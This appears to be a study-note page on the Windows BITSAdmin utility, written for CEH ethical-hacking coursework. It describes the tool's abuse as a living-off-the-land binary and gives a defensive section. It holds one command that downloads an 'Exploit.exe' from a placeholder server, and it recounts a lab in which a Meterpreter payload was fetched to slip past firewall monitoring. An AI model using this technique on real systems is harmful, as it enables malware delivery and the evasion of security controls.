# BITSAdmin

> **Category:** Windows Administrative Utility
>
> **Platform:** Windows
>
> **License:** Proprietary (Microsoft)
>
> **Official Website:** https://learn.microsoft.com/windows/

---

## Overview

BITSAdmin is a Windows command-line utility that manages the Background Intelligent Transfer Service (BITS) for transferring files between systems over HTTP, HTTPS, and SMB. Although designed for legitimate administrative tasks, attackers frequently abuse BITSAdmin as a Living-off-the-Land Binary (LOLBin) to download malicious payloads while bypassing traditional firewall and security monitoring mechanisms.

---

## Key Features

- File download and upload
- Background file transfers
- HTTP, HTTPS, and SMB support
- Job management
- Bandwidth throttling
- Resume interrupted transfers
- Native Windows utility
- LOLBin for security testing

---

## Common Usage

Download a file using BITSAdmin:

```cmd
bitsadmin /transfer Exploit.exe http://<server>/Exploit.exe C:\Exploit.exe
```

---

## CEH Practical Example

During **Module 12 – Evading IDS, Firewalls, and Honeypots**, BITSAdmin was used to download a Meterpreter payload from an attacker-controlled Apache web server to the target Windows machine. The exercise demonstrated how trusted Windows utilities can be abused to transfer malicious files while blending with legitimate system activity.

---

## Defensive Perspective

Organizations should monitor BITS jobs, restrict unnecessary use of BITSAdmin, implement application control policies, and detect abnormal outbound or inbound file transfers involving native Windows utilities to reduce the risk of firewall evasion and malware delivery.

---

## Used In

- Module 12 – Evading IDS, Firewalls, and Honeypots

---

## References

- Official Website: https://learn.microsoft.com/windows/
- Official Documentation: https://learn.microsoft.com/windows-server/administration/windows-commands/bitsadmin